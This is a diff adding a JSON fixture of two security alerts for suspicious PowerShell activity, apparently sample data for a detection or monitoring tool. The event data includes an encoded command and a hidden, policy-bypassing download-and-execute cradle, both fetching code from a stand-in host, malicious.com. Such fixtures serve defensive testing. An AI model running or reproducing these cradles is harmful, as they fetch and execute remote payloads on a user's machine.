@@ -1,0 +1,31 @@
+[
+  {
+    "name": "Suspicious PowerShell Encoded Command",
+    "level": "high",
+    "tags": ["attack.execution", "attack.t1059.001"],
+    "EventID": 4104,
+    "timestamp": "2026-06-14T10:15:32.000Z",
+    "Computer": "WORKSTATION-01",
+    "event_data": {
+      "CommandLine": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQA",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ScriptBlockText": "Invoke-WebRequest -Uri http://malicious.com/payload",
+      "User": "WORKSTATION-01\\testuser"
+    }
+  },
+  {
+    "name": "PowerShell Suspicious Download Cradle",
+    "level": "high",
+    "tags": ["attack.execution", "attack.t1059.001"],
+    "EventID": 1,
+    "timestamp": "2026-06-14T10:15:35.000Z",
+    "Computer": "WORKSTATION-01",
+    "event_data": {
+      "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "User": "WORKSTATION-01\\testuser"
+    }
+  }
+]
